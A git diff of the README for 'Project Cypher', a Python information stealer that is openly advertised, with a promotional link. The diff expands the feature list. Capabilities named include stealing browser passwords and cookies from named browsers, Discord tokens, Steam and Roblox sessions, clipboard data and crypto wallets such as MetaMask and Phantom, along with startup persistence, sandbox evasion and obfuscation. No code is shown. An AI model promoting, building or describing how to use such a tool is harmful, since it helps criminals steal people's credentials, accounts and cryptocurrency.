@@ -27,8 +27,8 @@ Project Cypher is a fast Python-based information stealer. It collects data in u
 ## 👉 [Check it out now!](https://ospreypr.xyz/)
 
 ## ✨Features
-- [x] Browser passwords (all Chromium-based)
-- [x] Browser cookies
+- [x] Browser passwords (Chrome & Edge)
+- [x] Browser cookies (Chrome, Brave, Edge, Opera, Yandex, Centbrowser, Firefox)
 - [x] Browser history
 - [x] Add to startup
 - [x] Discord token grabber
@@ -38,7 +38,7 @@ Project Cypher is a fast Python-based information stealer. It collects data in u
 - [x] Clipboard content
 - [x] Sandbox evasion
 - [x] Interesting/common files
-- [x] Crypto wallets (Exodus, etc.)
+- [x] Crypto wallets (Exodus, Electrum, MetaMask, Phantom & more)
 - [x] Code obfuscation
 - [x] Roblox cookies
 - [x] Steam session
